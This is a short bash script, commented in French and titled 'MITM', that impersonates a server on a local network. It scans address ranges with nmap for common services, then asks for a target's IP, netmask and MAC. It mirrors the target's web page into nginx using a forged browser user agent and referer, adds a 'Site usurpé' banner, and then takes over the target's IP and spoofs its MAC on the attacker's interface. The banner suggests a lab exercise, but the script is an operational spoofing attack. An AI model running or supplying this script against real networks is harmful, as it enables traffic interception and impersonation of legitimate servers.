#!/bin/bash
#MITM
# Script aux privilèges admin requis.

# Récupération des informations pour usurpation :
nmap -sSV -O -Pn -p 21,22,23,25,53,80,8080,443,110,139,143,161,162,3306,3389  192.168.1-10.1-255 # range a modifier pour être plus rapide, ou balayer plus large

# Récupérer l'IP, le masque et l'adresse MAC en résultat de commande nmap.
read -p "Entrer IP : " IP
read -p "Entrer Masque : " Mask
read -p "Entrer MAC address : " MAC


#####partie a mettre de côté dans un script

#URL=${IP}
#role.sh $URL
#puis dans le script récup la variable pour réutilisation interne.

# Installation du rôle miroir
apt-get install -y nginx nginx-extras
systemctl enable nginx 
systemctl start nginx

# L'URL dont vous voulez récupérer le contenu
URL=${IP}

# Le chemin du fichier HTML par défaut de Nginx
NGINX_DEFAULT_HTML="/var/www/html/index.html"

# Utilise curl pour récupérer le contenu de l'URL

NOUVEAU_CONTENU=$(curl -s -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3" -e "https://google.com" $URL)

# -s: Mode silencieux, pas de sortie ou de messages d'erreur.
# -A "Mozilla/5.0 ...": Simule une requête provenant du navigateur Chrome.
# -e "https://google.com": Indique que la requête provient de la page https://google.com.
# $URL: URL à interroger.


# Vérifie si curl a réussi à récupérer le contenu
if [ $? -eq 0 ]; then
    # Remplace le contenu du fichier HTML de Nginx avec le nouveau contenu
    echo "$NOUVEAU_CONTENU" | sudo tee $NGINX_DEFAULT_HTML > /dev/null
    sudo sed -i '/<\/body>/i <h1>Site usurpé<\/h1>' /var/www/html/index.html
    systemctl reload nginx
    echo "Le contenu de la page Nginx a été mis à jour."
    
else
    echo "Erreur lors de la récupération du contenu depuis l'URL."
fi

##### fin de partie a mettre a part


# Ajoute l'adresse IP avec le masque directement à l'interface enp0s8
ip addr add ${IP}/${Mask} dev enp0s8



# Désactive temporairement l'interface enp0s8
ip link set dev enp0s8 down

# Modifie l'adresse MAC de l'interface enp0s8
ip link set dev enp0s8 address ${MAC}

# Active à nouveau l'interface enp0s8
ip link set dev enp0s8 up




